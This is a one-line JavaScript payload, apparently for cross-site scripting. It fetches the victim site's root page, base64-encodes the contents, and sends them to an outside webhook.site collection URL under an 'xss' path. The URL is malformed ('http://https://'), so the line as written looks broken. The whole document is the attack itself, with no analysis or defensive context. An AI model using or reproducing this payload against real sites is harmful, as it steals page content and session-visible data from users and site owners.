fetch('/').then(r => r.text()).then(d => fetch('http://https://webhook.site/ede3adf6-696e-4862-b954-010d8adf94a6/xss?data=' + btoa(d)))
